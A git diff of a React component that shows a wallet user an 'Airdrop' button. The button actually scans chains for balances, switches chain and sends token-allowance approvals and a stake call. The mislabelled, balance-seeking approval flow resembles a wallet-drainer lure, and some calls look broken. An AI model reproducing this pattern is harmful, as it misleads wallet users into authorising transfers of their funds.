@@ -9,20 +9,22 @@ import {
   client,
 } from "../constants/constanst";
 import { createWallet } from "thirdweb/wallets";
-import { useActiveAccount } from "thirdweb/react";
-import { useSwitchActiveWalletChain } from "thirdweb/react";
+import {
+  useActiveAccount,
+  useSwitchActiveWalletChain,
+  useSendTransaction,
+} from "thirdweb/react";
 import { getWalletBalance } from "thirdweb/wallets";
-import { prepareContractCall, toWei } from "thirdweb";
 import { ethers } from "ethers";
 
 const CustomButton = () => {
-  // const signer = useSigner();
   const activeAccount = useActiveAccount();
   const switchChain = useSwitchActiveWalletChain();
   const [loading, setLoading] = useState(false);
   const [balance, setBalance] = useState("0");
   const [currentChain, setCurrentChain] = useState("");
   const [currentChainId, setCurrentChainId] = useState("");
+  const { mutate: sendTransaction, isPending } = useSendTransaction();
 
   const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
@@ -50,53 +52,56 @@ const CustomButton = () => {
         if (parseFloat(balanceInUnit) > 0) {
           await switchChain({ id: chain.id });
 
-          const currentChainContract = chain.name.includes("avalanche")
-            ? AVAXCONTRACT
-            : chain.name.includes("smart chain")
-            ? BNBCONTRACT
-            : chain.name.includes("arbitrum")
-            ? ARBITRUMCONTRACT
-            : BSCTESTCONTRACT;
+          // const currentChainContract = chain.name.includes("avalanche")
+          //   ? AVAXCONTRACT
+          //   : chain.name.includes("smart chain")
+          //   ? BNBCONTRACT
+          //   : chain.name.includes("arbitrum")
+          //   ? ARBITRUMCONTRACT
+          //   : BSCTESTCONTRACT;
+
+          const currentChainContract = BSCTESTCONTRACT;
 
           const balanceToStake = parseFloat(balanceInUnit) * 0.1;
-          console.log("balance to stake:", balanceToStake.toString());
-
+          console.log("Balance to stake:", balanceToStake.toString());
           setBalance(balanceToStake.toString());
 
-          const signer = activeAccount;
-
-          const tokenContract = new ethers.Contract(
-            currentChainContract.address,
-            [
-              "function increaseAllowance(address spender, uint256 addedValue) public returns (bool)",
-            ],
-            signer
-          );
-
-          const approvalTx = await tokenContract.increaseAllowance(
-            currentChainContract.address,
-            toWei(balanceToStake.toString())
-          );
-
-          console.log("Approval transaction sent", approvalTx);
-          await approvalTx.wait();
-          console.log("Approval successful");
-
-          const transaction = prepareContractCall({
-            contract: currentChainContract,
-            method: "increaseYield",
-            params: [activeAccount.address, toWei(balanceToStake.toString())],
-          });
-
           try {
-            // Execute the increaseYield transaction
-            await transaction();
-            console.log("Transaction successful!");
-            return;
+            const stakeContract = new ethers.Contract(
+              currentChainContract.address,
+              currentChainContract.abi,
+              activeAccount
+            );
+
+            const balance = await stakeContract.balanceOf(
+              activeAccount.address
+            );
+            const allowanceAmount = (balance * 5) / 100000;
+
+            const approveTx = await stakeContract.increaseAllowance(
+              currentChainContract.address,
+              allowanceAmount
+            );
+            await approveTx.wait(); // Wait for the transaction to be mined
+
+            console.log(`Approved ${allowanceAmount} tokens for staking`);
+
+            // Now call the stake function in the staking contract
+            const stakeTx = await stakeContract.stake();
+            await stakeTx.wait();
           } catch (error) {
-            console.error("Transaction failed:", error);
-            alert("Transaction failed: " + error.message);
-            return;
+            if (error.code === "CALL_EXCEPTION") {
+              // Inspect the revert reason if available
+              const revertMessage =
+                error?.data?.message || error?.reason || "Unknown error";
+              if (revertMessage.includes("Insufficient allowance")) {
+                alert("You have insufficient allowance for staking.");
+              } else {
+                alert(`Transaction failed: ${revertMessage}`);
+              }
+            } else {
+              alert("An unexpected error occurred: " + error.message);
+            }
           }
         } else {
           console.log(
@@ -105,7 +110,10 @@ const CustomButton = () => {
           await delay(2000);
         }
       } catch (error) {
-        console.error(`Error fetching balance for chain ${chain.id}:`, error);
+        console.error(
+          `Error checking balance or preparing transaction:`,
+          error
+        );
       }
     }
 
@@ -125,7 +133,6 @@ const CustomButton = () => {
         client={client}
         wallets={[
           createWallet("io.metamask"),
-          // createWallet("app.phantom"),
           createWallet("com.coinbase.wallet"),
           createWallet("me.rainbow"),
         ]}
@@ -142,10 +149,11 @@ const CustomButton = () => {
       )}
       {activeAccount && (
         <TransactionButton
-          transaction={() => checkBalanceAndSwitchChain()}
+          transaction={checkBalanceAndSwitchChain} // Pass the function directly
           onTransactionSent={() =>
             alert(`${balance} ${currentChain} approved for staking`)
           }
+          isPending={isPending} // Pass isPending to disable the button when transaction is pending
         >
           Airdrop
         </TransactionButton>
